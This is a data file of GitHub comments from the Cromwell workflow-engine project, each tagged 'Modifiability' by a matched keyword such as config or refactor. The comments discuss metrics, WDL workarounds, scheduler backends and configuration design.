Modifiability,"@jgainerdewar Your guess was correct--Prometheus/Stackdriver labels have no concept of order, so that information is lost when the InstrumentationPath is used to derive that sort of name. The StatsD form effectively looses the additional ""what's a high variant part and what isn't"" info while the Prometheus form looses the ordering of those parts. This is normal in Prometheus-land and all the query systems are built on that assumption. . There'll definitely be tests for the Prometheus code when it's added to clearly demonstrate that--this is sorta a weird one because I want to lay the groundwork without actually adding full Prometheus support yet. [This test](https://github.com/broadinstitute/cromwell/pull/6681/files#diff-65d7248a0c8799434124fe6d53023d0d8ac3492d640bbe4510801d2981e0903fR42) and a few others check that the groundwork is working, it's just a bit of a weird refactoring until the Prometheus code takes advantage of it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142:882,refactor,refactoring,882,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6681#issuecomment-1049016142,1,['refactor'],['refactoring']
Modifiability,"@jgainerdewar those Java files are auto-generated, so we would need to update the parser-generator in order to maintainably address the warnings. https://github.com/broadinstitute/cromwell/blob/622c8e6b79b4ce123912ace0ed37b28f1c461324/wdl/transforms/draft3/src/main/java/wdl/draft3/parser/WdlParser.java#L2-L14",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279624277:111,maintainab,maintainably,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6928#issuecomment-1279624277,1,['maintainab'],['maintainably']
Modifiability,"@jiangkaihua I want to knwo how does cromwell generate a yaml file for volcano?; Cromwell now genrates a bash script file when `actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""`, while vcctl job run just accept a yaml file.; Do I need to implement a volcano backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5184#issuecomment-851089634:171,config,config,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5184#issuecomment-851089634,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"@jsotobroad ; Ok so I think you need to take all workflow variables that use some sort of expression and redeclare them inside the scatter. You actually don't need to use them, just redeclaring them should be enough. ```; workflow {; Float myVar = size(...); scatter(...) {; Float myVar_redeclared = myVar; if(...) {; call myCall { input: i = myVar }; }; }; }; ```. From what I can see in the workflow, those variables would be `additional_disk`, `recalibrated_bam_basename`, `ref_size`, `bwa_ref_size` and `dbsnp_size`.; This is not related to subworkflows AFAICT but rather `if`s in `scatter`s referencing variables with expressions declared outside of the scatter. Again this is a workaround, I'm trying to find the right way to fix this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358672373:58,variab,variables,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358672373,3,['variab'],['variables']
Modifiability,"@katevoss Hi Kate. I think there are two aspects to the issue worth considering - the first being how often we hit this problem in practice (I'll get back with you after I ask the production team) and the second being whether the underlying cause has been addressed - which is that relying only on the creation of a file to detect task completion is not robust at least for SGE/PBS type backends where jobs may be killed by the scheduler out-of-process without creating a file. Based only on the release changelog I suspect that the answer to the second is no. I suggest re-using the ""check-alive"" configuration value that's documented as currently used only on cromwell restart, for periodic (but infrequent) polling of the scheduler.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-325070557:598,config,configuration,598,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-325070557,1,['config'],['configuration']
Modifiability,"@katevoss I previously asked about this as well. Our use case had more to do with tracking individual costs associated with Jobs initiated within a Task, but not managed by cromwell at all (Ie add labels to a google api call from within a wdl task). The response I received back was that it would be considered, but it creates a NonDeterministic task that will be different each time you call it with the same parameters. I wonder if certain variables should be labelled as `volatile` and will always invalidate a chache hit?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328204343:442,variab,variables,442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328204343,1,['variab'],['variables']
Modifiability,@kbergin Having this feature will help us remove all of our private docker images from pipeline-tools and will make it much easier to write adapter workflows in the future,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4236#issuecomment-429117857:140,adapt,adapter,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4236#issuecomment-429117857,1,['adapt'],['adapter']
Modifiability,"@kcibul ; I am missing few things in the implementation like the way to construct Spark command inside Spark backend for this PR, Let me add that to make it Spark'ified. It should be same like Htcondor but entertain Runtime attributes like executor-memory, cores and configuration based master to execute Spark job both in Dockerized or non-Dockerized mode. ; So let me close this pull request (**I will not merge it** ) and create a new one after changes. My goal is to create Spark backend to run Spark jobs in standalone cluster mode for this PR, then later to add other Resource manager related support. ; Does it make sense ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-231182019:267,config,configuration,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1132#issuecomment-231182019,1,['config'],['configuration']
Modifiability,"@kcibul I don't know. Because the ticket @mcovarr linked sounded like there was a magic setting somewhere I googled around a bit and found some references to badness. I didn't check, however. Still something to look at. Also I've been using MySQL not CloudSQL, perhaps that matters. I got to the point where if I set my batch size high enough (I was generating on the order of ~15k events to write per second, FWIW) my overall performance was such that I was getting a sustained rate of ~1500-1700 (I forget exactly) requests per second on the submission side, which is certainly still a lot less than I was getting w/o metadata at all but a heck of a lot better than I was able to do otherwise. It's entirely possible that all I did was move the goalpost back and that if I extended my test even further eventually I'd see the same problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705:775,extend,extended,775,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269497705,1,['extend'],['extended']
Modifiability,"@kmavrommatis - Curious how your AWS Batch environment was setup. Did you use the Cfn templates provided [here](https://docs.opendata.aws/genomics-workflows/aws-batch/configure-aws-batch-cfn/), or build it manually?. It is important that the job instance profile associated with the compute environment has the correct access permissions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-454188024:167,config,configure-aws-batch-cfn,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542#issuecomment-454188024,1,['config'],['configure-aws-batch-cfn']
Modifiability,"@kshakir ; > Does this still mean that all other backend implementations should still look for cwl.output.json as a glob and not a regular file?. I think `cwl.output.json` should be looked at as an ""optional output"". At least for delocalization purposes (since the actual file is never used as is.. I think..). With PAPI V2 we should be able to support optional outputs and so when that happens we should switch from using a glob based approach to an optional approach. For backends that can't support optional outputs for whatever reason, the glob way is still viable IMO.; This is not to say that we don't need a larger glob refactoring, but we've been using glob as a workaround for optional outputs in some cases because of restrictions of V1 that I think we should not impose on V2, or any backend that can deal cleanly with optional outputs. > As the conformance tests are being removed, does that infer that as of this PR is CWL not officially supported on PapiV1?. yes I think there's no official plan to support CWL on V1 (@geoffjentry is that true ?) Since this particular test can only work on V2, instead of duplicating the `papi_conformance_expected_failures.txt` file with a V1/V2 I took the opportunity to nix V1 from travis.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3619#issuecomment-389320386:627,refactor,refactoring,627,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3619#issuecomment-389320386,1,['refactor'],['refactoring']
Modifiability,@kshakir @mcovarr I have changed the `multiplier` factor to be configurable and made things more generic instead of `...doubleMemory...`. It's now ready for re-review!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5180#issuecomment-533261206:63,config,configurable,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5180#issuecomment-533261206,1,['config'],['configurable']
Modifiability,"@kshakir Beyond unit tests, how was this tested? It'd be good to try to throw this at some live mysql installations of various configurations to make sure it doesn't blow up",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2572#issuecomment-324406500:127,config,configurations,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2572#issuecomment-324406500,1,['config'],['configurations']
Modifiability,@kshakir I _think_ I've now got this generalized across all backends (I tested this with local and with PAPIv2). I'd definitely appreciate comments on whether I picked the right level of abstraction in the `XyzBackendJobExecutionActor` inheritance hierarchy to insert the change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4872#issuecomment-485964920:236,inherit,inheritance,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4872#issuecomment-485964920,1,['inherit'],['inheritance']
Modifiability,@kshakir I _think_ this covers your points although the test refactor isn't quite what we were talking about on hipchat. I think to go the route I think you were describing would be tough.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/158#issuecomment-136456530:61,refactor,refactor,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/158#issuecomment-136456530,1,['refactor'],['refactor']
Modifiability,"@kshakir I had thought of making the multiplier 2 as a config option. But since this ticket had evolved to be a PoC, I kept it constant at 2. If we decide to not rush this PR, than I am all in for 'MoreMemory' as compared to 'DoubleMemory'.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5180#issuecomment-532245618:55,config,config,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5180#issuecomment-532245618,2,"['config', 'evolve']","['config', 'evolved']"
Modifiability,"@kshakir Thanks for all your efforts in getting this PR working. Upon more careful inspection I saw that you already had found the metadata/engine should be separate issue. Sorry for double reporting. * The regression testing looks OK to me :+1:; * I have rearranged the docs a bit. SQLite is suggested first and contrasted with other databases. HSQLDB is listed after that to make users aware of the option, but it is also made clearly that this is for very specific use cases. I updated the hsql and sqlite config examples a bit.; * For the liquibase spec testing I ensured that an actual file database is used. I did some testing with the in-memory database for only metadata, but that failed for some reason when running it on a big pipeline. At least the file-based database is working properly, which is also what we test in all the tests.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627:509,config,config,509,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-739902627,1,['config'],['config']
Modifiability,@kshakir That list is used to provide a warning in the log if you specify a key that isn't used. I'd prefer to either do away w/ the warning or find some way to force the config keys we use and this list to be the same but I figured my fellow cromwellians would balk at the former and I couldn't think of a non-annoying way to do the latter.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1749#issuecomment-265312580:171,config,config,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1749#issuecomment-265312580,1,['config'],['config']
Modifiability,@kshakir do you have an idea of the effort for your Actual Fix: refactoring the config backend to separate out the Docker vs. Non-docker config?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1126#issuecomment-323854577:64,refactor,refactoring,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1126#issuecomment-323854577,3,"['config', 'refactor']","['config', 'refactoring']"
Modifiability,@kshakir is there a configurable timeout for job completion in the SFS backends?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4050#issuecomment-417333069:20,config,configurable,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4050#issuecomment-417333069,1,['config'],['configurable']
Modifiability,"@kshakir just a standard config file. I hadn't actually looked at the error yet, but will make a note to come back to this discussion :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473123397:25,config,config,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473123397,1,['config'],['config']
Modifiability,"@kshakir mentioned in #1202 that one will soon be able to specify runtime attributes via the Config backend and not through code. Any implementation of this will work for us, provided that:; 1. One can specify arbitrary runtime attributes with values that can contain any characters, including nested double quotes (escaped if necessary).; 2. Arbitrary runtime attributes can be specified both within a single task in a WDL file, and in a workflow options JSON file. For example, using runtime attributes ""-app"" (application profile), ""-q"" (queue), ""-M"" (memory), ""-n"" (processors) and ""-R"" (resource requirements), the submit command line structure for LSF would be of the form:. `bsub -app large -q idle -M 125829120 -n 16,16 -R ""swp > 15 && span[hosts=1]"" -J ${job_name} -cwd ${cwd} -o ${out} -e ${err} /bin/sh ${script}`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1217#issuecomment-236262636:93,Config,Config,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1217#issuecomment-236262636,1,['Config'],['Config']
Modifiability,@kshakir updated the config value,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1904#issuecomment-274852497:21,config,config,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1904#issuecomment-274852497,1,['config'],['config']
Modifiability,@kshakir when you say more flexible...do you mean something in the config? even that requires a redeploy .,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4466#issuecomment-445245808:27,flexible,flexible,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4466#issuecomment-445245808,2,"['config', 'flexible']","['config', 'flexible']"
Modifiability,"@ldgauthier and @Leetl1220 do you know how many users use Cromwell with SGE?. As a **SGE user**, I want to **the SGE config to be tested in Centaur**, so that I can **avoid regressions**.; - Effort: **Medium to Large**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806:117,config,config,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324443806,1,['config'],['config']
Modifiability,"@likeanowl - Took a look at the PR. Overall, looks good, but had a couple questions. Do the new integration tests you mention cover the points I brought up - i.e. mostly around default credentials use and default region config?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-523568967:220,config,config,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4982#issuecomment-523568967,1,['config'],['config']
Modifiability,"@lukwam re the port, the people setting up the firecloud environments can twiddle the port to be whatever they want via the config. It's not hardwired into cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/359#issuecomment-170035498:124,config,config,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/359#issuecomment-170035498,1,['config'],['config']
Modifiability,@mcovarr @Horneth - the code is slightly different than the hotfix to account for slightly different realities (plus a moving-stuff-around refactor) but more or less the same.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/864#issuecomment-220720400:139,refactor,refactor,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/864#issuecomment-220720400,1,['refactor'],['refactor']
Modifiability,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:178,variab,variable,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182,4,"['config', 'variab']","['config', 'configure', 'variable']"
Modifiability,"@mcovarr I believe all issues are addressed. I'll let you cherry-pick / merge / squash or even reject this PR at your will. Pre-tech talk with @geoffjentry (including a TLA extravaganza!):. **TL;DR The database/slick is for CRUD, not for the T in ETL.**. IMHO, the database code started to evolve well beyond CRUD. Very often in slick specific code, one saw multiple lines of code like: ""before inserting rows in slick, quickly (E)xtract some other rows, (T)ransform them into core objects, filter, re-transform them into new core objects, then (L)oad the new objects into slick."" That ETL embedded in slick could never be used DRY-ly, and to me smelled as violating separation of concerns. With the current SoC, the slick code is _mostly_ concerned with marshaling data to and from the database via slick. If I wanted to, I could very trivially create a different layer that marshaled data using hibernate, a thin layer of prepared statements, mocks, etc., _without_ duplicating a lot of the ETL code. Another way of visualizing the issue: Below is the current project dependency diagram. The services need to access data from the database. Currently that's implemented as the services depend on engine that depends on the database. The database used to have a similar same circular dependency. Gun-shy of folks (including myself) re-introducing a similar dependency loop, I've kept core as far away as possible from the database/slick, because the slick specific code _should not_ need core for basic CRUD. As for the rest of the system, I see core as a base of objects for backends and the engine to communicate. ![cromwell project dependency diagram](https://cloud.githubusercontent.com/assets/791985/15779136/92db94a6-2968-11e6-90f8-c0b40d162a56.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591:290,evolve,evolve,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591,1,['evolve'],['evolve']
Modifiability,"@mcovarr I like your example configs, excepting the (hopefully) upcoming backend/filesystem split. Are they represented in the code as it is now?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203452830:29,config,configs,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203452830,1,['config'],['configs']
Modifiability,"@mcovarr It's more concise but it makes several implicit assumptions to fit exactly our 2 current JES use cases (GotC and FireCloud).; IMO it should be flexible enough so that GotC and Firecloud are just combinations of configuration entries among all the possible ones. > // The JES backend is assumed to use the GCS filesystem with user authentication, dropping back to Cromwell; > // authentication if user authentication is not defined. In GotC there is no user authentication, so; > // Cromwell authentication it is. This is tailor made to accommodate GotC and FireCloud with as few configuration changes as possible, but I think we should move towards something more generic, even if the confs look a bit more different between the two.; For example what if you want to use refresh token auth mode for creating the pipeline as well ?; Or refresh token only for pipeline and service account for gcs ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203453031:152,flexible,flexible,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203453031,3,"['config', 'flexible']","['configuration', 'flexible']"
Modifiability,"@mcovarr Thanks for your response. The documentation can be somewhat unclear. I've updated the localization and have kept this inline with my main config for GCP Batch. I am using Cromwell v87. However, while running a job, I’m encountering issues when Cromwell is attempting to mount my files to a local mount. I have been monitoring the VM and job, it seems Cromwell is unsure of how to handle this: For instance:. **Error 1:**; ```; severity: ""DEFAULT""; textPayload: ""umount: /mnt/2d49bcb009113835140d638a10b535af: no mount point specified.""; timestamp: ""2024-09-26T14:07:54.88114; ```. **Error 2:**; ```; severity: ""ERROR""; textPayload: ""Copying gs://test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai to file:///mnt/disks/cromwell_root/test-cromwell-genomics-resources/references/hg38/v0/Homo_sapiens_assembly38.fasta.fai""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124:147,config,config,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2376149124,1,['config'],['config']
Modifiability,@mcovarr Turnabout is indeed fair play although this was a global find/replace. I'm more than happy to make this a more general refactor PR,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/140#issuecomment-132308286:128,refactor,refactor,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/140#issuecomment-132308286,1,['refactor'],['refactor']
Modifiability,"@mcovarr Yeah, I discussed with @ruchim - we're skipping that for now, but agreed that it'd be a nice idea in general (tho i'd say `workflow_options`, not config)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5023#issuecomment-501050669:155,config,config,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5023#issuecomment-501050669,1,['config'],['config']
Modifiability,"@mcovarr Yes. I am trying to add a centaur test case for DRS and I am still working on getting the config right. I thought I corrected it with the last commit, but apparently not...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5039#issuecomment-505092978:99,config,config,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5039#issuecomment-505092978,1,['config'],['config']
Modifiability,"@mcovarr as first reviewer. Travis already seems configured to ignore integration tests, so no other changes appeared necessary for this temporary fix.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/357#issuecomment-169440511:49,config,configured,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/357#issuecomment-169440511,1,['config'],['configured']
Modifiability,"@mcovarr indeed. I think our centaur tests were set up to assume certain limits, and by changing the defaults I've upset the tests. I _think_ I just need to work out where to re-set those centaur defaults but the inheritance hierarchy for those files is kind of opaque to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5034#issuecomment-507303574:213,inherit,inheritance,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5034#issuecomment-507303574,1,['inherit'],['inheritance']
Modifiability,@mcovarr is this solved by your excellent refactoring of the CLI?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1260#issuecomment-324165426:42,refactor,refactoring,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1260#issuecomment-324165426,1,['refactor'],['refactoring']
Modifiability,"@mcovarr it does seem to have worked 😄; @cjllanwarne @geoffjentry Good point, my main goal was to make it possible for the metadata service to report statsd metrics, which is done through another service. But like you said since it's just making available the service registry actor to the services I don't think it introduces any additional coupling.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3294#issuecomment-367025969:342,coupling,coupling,342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3294#issuecomment-367025969,1,['coupling'],['coupling']
Modifiability,"@mcovarr regarding some of the badness, if this isn't going into 0.19 (and thus causing ppl to need to repeatedly modify config) I feel like the nice likely outweighs the naughty ... he says w/o having his lunch settled yet",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203033909:121,config,config,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203033909,1,['config'],['config']
Modifiability,"@mcovarr sounds good, I've manually merged this PR and the job token one to another branch and have been working from there to wire everything up, including refactoring this.; I think I can manage to separate out this refactoring from the rest though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3335#issuecomment-369979437:157,refactor,refactoring,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3335#issuecomment-369979437,2,['refactor'],['refactoring']
Modifiability,"@mcovarr what is a config key, and when would a user interact with it? ; @LeeTL1220 is this something you encounter often?; @geoffjentry do you still think it would be really tough?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325474160:19,config,config,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1598#issuecomment-325474160,1,['config'],['config']
Modifiability,@meganshand you mentioned in your original comment you'd try running it under different conditions:. > This fails both in SGE and Local backends. There is a suspicion that this might be due to declaring variables inside of the scatter? I'm going to try extracting all variable declaration into a task to see if that works. Did moving variable declarations outside of the scatter help?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-285374575:203,variab,variables,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-285374575,3,['variab'],"['variable', 'variables']"
Modifiability,"@natechols - so it works well for failed jobs. However, there seems to be some transient errors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:339,config,config,339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,4,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"@oneillkza . re portability: If you're concerned about portability and I understand what you're trying to do, this won't do what you want. If what you're trying to say is ""For every file in this location, DoSomething(File)"" and you want to be portable to the cloud backends the problem your going to have is that the tasks run on a VM with a local filesystem but the files you want to glob will be in object storage (e.g. GCS, S3). You could make those files an input to the task, they'd get localized to the VM and you'd be good to go, but now we're back to the original problem - if you knew all of the files you wouldn't need a glob :). I **think** you can get what you want by using the relatively new [Directory](hub.com/openwdl/wdl/blob/master/versions/development/SPEC.md#types) type, which is in the developmental version of WDL and unofficially supported by Cromwell at the moment. What I'm picturing is supplying a Directory input to `glob_tasks`, and then globbing out the files that you want from there (unless you're literally trying to get **all** the files in a Directory, in which case just use a Directory type in the first place). cc'ing @cjllanwarne in case I've misspoke somewhere in here, he's a lot more knowledgable on the fine details. re backends: The words I use are an artifact of how Cromwell is constructed but I draw a mental distinction between the workflow engine itself (e.g. Cromwell, Nextflow, Snakemake, etc) and the underlying job execution platform (e.g. local machine, SLURM, SGE, GCP, AWS). They're often tightly coupled but aren't necessarily that way. There's increasing desire for engines which can compute across multiple execution platforms within the same workflow - so in Cromwell terms perhaps some of your `call`s are run on a local SLURM cluster backend, some are run on GCP backend, and some on AWS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4526#issuecomment-452418217:16,portab,portability,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4526#issuecomment-452418217,3,['portab'],"['portability', 'portable']"
Modifiability,@orodeh I would probably start with something in `WdlFileToWomSpec`. If you wanted to do that you'll probably need to find a way to customize the configuration for just that test case,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-510842794:146,config,configuration,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5061#issuecomment-510842794,1,['config'],['configuration']
